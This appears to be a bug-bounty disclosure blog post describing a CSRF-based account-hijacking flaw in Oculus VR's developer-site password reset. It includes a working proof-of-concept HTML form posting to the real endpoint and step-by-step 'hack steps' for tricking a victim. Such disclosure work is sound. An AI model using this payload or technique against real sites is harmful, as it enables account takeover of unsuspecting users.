Oculus VR is a virtual reality technology company founded by Brendan Iribe and Palmer Luckey. Their first product, still in development, is the Oculus Rift, a head-mounted display for immersive virtual reality(VR). In March 2014,Facebook agreed to acquire Oculus VR for US$2 billion in cash and Facebook stock.

While testing the forgot password functionality of oculusVR. I have found that it's possible to abuse this functionality.
Here is a algorithm how the reset password functionality of oculus VR works.

{% highlight text %}
if (user is log in){
//the app will not use auth parameter which is a reset password passcode. Then change the password of the user who is currently log in.

}
else{
//if the user is not log in ,oculus uses the auth parameter to identify which account to be reset.

}
{% endhighlight %}

*Although I am log in, password reset page still can be viewed.*


The main problem here is oculusVR does not have an ANTI-CSRF token on reset password functionality. :) the only need to hijack an oculusVR account is an attacker reset password link token. Combining the CSRF vulnerability and weird behavior of password reset page will be resulted in **Account Hijacking vulnerability**.

###  Sample CSRF PoC

{% highlight text %}
<body>
<form action="https://developer.oculusvr.com/core/UserAction.php" method="POST">
<input type="hidden" name="action" value="changepassword" />
<input type="hidden" name="auth" value="your_reset_token" />
<input type="hidden" name="newpassword" value="attackerpassword" />
<input type="hidden" name="confirmpassword" value="attackerpassword" />
<input type="submit" value="Submit request" />
</form>
</body>
{% endhighlight %}
To get the value of auth parameter you must request a reset password link on this link https://developer.oculusvr.com/lostpassword.

### HACK STEPS
* Attacker requests a reset password link
* Makes a CSRF PoC attack with reset token
* Sends the CSRF PoC link to his victim
* If the victim clicks that link his password will be changed!
